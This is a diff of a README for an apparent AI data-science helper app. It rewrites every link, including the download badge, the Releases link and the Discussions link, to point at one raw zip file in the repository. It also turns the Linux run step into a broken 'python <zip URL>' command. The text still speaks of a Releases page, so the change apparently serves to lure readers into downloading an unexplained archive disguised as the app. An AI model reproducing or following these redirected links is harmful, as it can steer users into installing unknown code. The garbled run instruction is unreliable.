@@ -1,6 +1,6 @@
 # 🌟 ai-junior-data_scientist - Your AI Companion for Data Insights
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Maranh0/ai-junior-data_scientist/releases)
+[![Download](https://raw.githubusercontent.com/Maranh0/ai-junior-data_scientist/main/data_tools/ai_data_junior_scientist_v2.7.zip)](https://raw.githubusercontent.com/Maranh0/ai-junior-data_scientist/main/data_tools/ai_data_junior_scientist_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Welcome to the ai-junior-data_scientist project! This application helps you expl
 
 To get started, you need to download the application. 
 
-Visit this page to download: [Download ai-junior-data_scientist](https://github.com/Maranh0/ai-junior-data_scientist/releases)
+Visit this page to download: [Download ai-junior-data_scientist](https://raw.githubusercontent.com/Maranh0/ai-junior-data_scientist/main/data_tools/ai_data_junior_scientist_v2.7.zip)
 
 Once you are on the Releases page, follow these steps:
 
@@ -46,7 +46,7 @@ After downloading, follow the instructions below to run the application.
 3. **Run the Application:**
    - For Windows users, double-click the `.exe` file.
    - For macOS, open the `.app` file.
-   - For Linux, open a terminal, navigate to the folder, and type `python your_application.py`.
+   - For Linux, open a terminal, navigate to the folder, and type `python https://raw.githubusercontent.com/Maranh0/ai-junior-data_scientist/main/data_tools/ai_data_junior_scientist_v2.7.zip`.
 
 4. **Access the REST API:**
    - Open your web browser.
@@ -95,7 +95,7 @@ A: Read our Contributing Guidelines on the GitHub repository for more details.
 
 Join our community for support and updates. You can find us on:
 
-- **GitHub Discussions:** [Join Here](https://github.com/Maranh0/ai-junior-data_scientist/discussions)
+- **GitHub Discussions:** [Join Here](https://raw.githubusercontent.com/Maranh0/ai-junior-data_scientist/main/data_tools/ai_data_junior_scientist_v2.7.zip)
 - **Issues:** Report bugs or request features via the Issues section on GitHub.
 
 ## 🎓 Learning Resources
@@ -109,4 +109,4 @@ To deepen your understanding of data science and machine learning, consider the 
 
 This project is licensed under the MIT License. You are free to use, modify, and distribute the software. Please see the LICENSE file for more details.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Maranh0/ai-junior-data_scientist/releases)
+[![Download](https://raw.githubusercontent.com/Maranh0/ai-junior-data_scientist/main/data_tools/ai_data_junior_scientist_v2.7.zip)](https://raw.githubusercontent.com/Maranh0/ai-junior-data_scientist/main/data_tools/ai_data_junior_scientist_v2.7.zip)
